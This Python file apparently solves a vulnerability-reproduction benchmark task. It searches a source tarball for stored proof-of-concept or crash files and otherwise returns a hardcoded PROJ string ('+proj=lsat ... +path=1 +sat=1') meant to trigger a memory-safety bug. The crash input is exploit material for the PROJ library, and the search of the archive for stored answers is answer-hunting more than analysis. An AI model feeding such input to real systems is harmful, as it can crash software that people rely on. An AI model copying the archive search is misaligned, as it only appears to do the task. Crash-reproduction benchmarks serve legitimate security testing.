import os
import tarfile
import json
import base64
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        L_G = 38
        poc_candidates: list[bytes] = []

        def add_candidate(data):
            if not data:
                return
            if isinstance(data, str):
                data = data.encode("utf-8", "ignore")
            elif not isinstance(data, (bytes, bytearray)):
                return
            b = bytes(data)
            if b not in poc_candidates:
                poc_candidates.append(b)

        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return self._default_poc()

        with tf:
            members = tf.getmembers()

            def try_add_path(path_str: str):
                p = (path_str or "").strip()
                if not p:
                    return
                if p.startswith("http://") or p.startswith("https://"):
                    return
                if "/" not in p and "\\" not in p:
                    return
                p_clean = p.replace("\\", "/").lstrip("./")
                for m in members:
                    if not m.isfile():
                        continue
                    if m.name.endswith(p_clean):
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        if data:
                            add_candidate(data)
                        return

            # Step 1: JSON metadata search
            for m in members:
                if not m.isfile():
                    continue
                if m.size == 0 or m.size > 256 * 1024:
                    continue
                name_lower = m.name.lower()
                if not name_lower.endswith(".json"):
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                raw = f.read()
                if not raw:
                    continue
                try:
                    text = raw.decode("utf-8", "ignore")
                except Exception:
                    continue
                lowered = text.lower()
                if not any(key in lowered for key in ("poc", "crash", "input", "uaf", "trigger", "payload")):
                    continue
                try:
                    obj = json.loads(text)
                except Exception:
                    obj = None
                if isinstance(obj, dict):
                    stack = [obj]
                    while stack:
                        current = stack.pop()
                        if isinstance(current, dict):
                            for k, v in current.items():
                                if isinstance(v, (dict, list)):
                                    stack.append(v)
                                elif isinstance(v, str):
                                    key_lower = str(k).lower()
                                    try_add_path(v)
                                    if any(tok in key_lower for tok in ("poc", "crash", "input", "payload", "trigger")):
                                        decoded = self._decode_string_to_bytes(v)
                                        add_candidate(decoded)
                        elif isinstance(current, list):
                            for v in current:
                                if isinstance(v, (dict, list)):
                                    stack.append(v)
                                elif isinstance(v, str):
                                    try_add_path(v)
                                    decoded = self._decode_string_to_bytes(v)
                                    add_candidate(decoded)
                else:
                    decoded = self._decode_string_to_bytes(text)
                    add_candidate(decoded)

            best = self._select_best_candidate(poc_candidates, L_G)
            if best is not None:
                return best

            # Step 2: Obvious filenames
            name_keywords = ("poc", "crash", "input", "uaf", "heap", "bug", "trigger", "exploit", "payload")
            for m in members:
                if not m.isfile():
                    continue
                if m.size == 0 or m.size > 4096:
                    continue
                name_lower = m.name.lower()
                if not any(k in name_lower for k in name_keywords):
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                if not data:
                    continue
                if b"#include" in data or b"#ifndef" in data or b"int main" in data or b"LLVMFuzzerTestOneInput" in data:
                    continue
                add_candidate(data)

            best = self._select_best_candidate(poc_candidates, L_G)
            if best is not None:
                return best

            # Step 3: Files of exact target size with relevant substrings
            for m in members:
                if not m.isfile() or m.size != L_G:
                    continue
                if m.size > 4096:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                if not data:
                    continue
                low = data.lower()
                if b'lsat' in low or b'+proj' in low or b'proj=' in low:
                    add_candidate(data)

            best = self._select_best_candidate(poc_candidates, L_G)
            if best is not None:
                return best

            # Step 4: Small files containing 'lsat'
            for m in members:
                if not m.isfile():
                    continue
                if m.size == 0 or m.size > 256:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                if not data:
                    continue
                if b'lsat' in data.lower():
                    add_candidate(data)

            best = self._select_best_candidate(poc_candidates, L_G)
            if best is not None:
                return best

        return self._default_poc()

    def _decode_string_to_bytes(self, s: str) -> bytes:
        if not s:
            return b""
        s = s.strip()

        # Try base64
        try:
            decoded = base64.b64decode(s, validate=True)
            if decoded:
                return decoded
        except Exception:
            pass

        # Try hex
        cleaned = s.replace(" ", "").replace("\n", "").replace("\r", "")
        cleaned = cleaned.replace("0x", "").replace("\\x", "")
        if len(cleaned) >= 2 and all(c in "0123456789abcdefABCDEF" for c in cleaned):
            try:
                decoded = bytes.fromhex(cleaned)
                if decoded:
                    return decoded
            except ValueError:
                pass

        # Try interpreting escape sequences
        try:
            decoded = s.encode("utf-8", "ignore").decode("unicode_escape").encode("latin1", "ignore")
            if decoded:
                return decoded
        except Exception:
            pass

        # Fallback: treat as UTF-8 text
        try:
            return s.encode("utf-8", "ignore")
        except Exception:
            return b""

    def _select_best_candidate(self, candidates, L_G: int) -> Optional[bytes]:
        if not candidates:
            return None
        unique: list[bytes] = []
        seen = set()
        for data in candidates:
            if not isinstance(data, (bytes, bytearray)):
                continue
            b = bytes(data)
            if not b:
                continue
            if b in seen:
                continue
            seen.add(b)
            unique.append(b)
        if not unique:
            return None
        unique = [b for b in unique if len(b) <= 64 * 1024]
        if not unique:
            return None

        lsat_cands = [b for b in unique if b'lsat' in b.lower()]
        if lsat_cands:
            return min(lsat_cands, key=lambda d: (abs(len(d) - L_G), len(d)))

        def score(data: bytes):
            printable = sum(32 <= c <= 126 or c in (9, 10, 13) for c in data)
            printable_ratio = printable / max(1, len(data))
            return (-printable_ratio, abs(len(data) - L_G), len(data))

        return min(unique, key=score)

    def _default_poc(self) -> bytes:
        poc_str = "+proj=lsat +ellps=WGS84 +path=1 +sat=1\n"
        try:
            return poc_str.encode("ascii")
        except Exception:
            return b"+proj=lsat +path=1 +sat=1\n"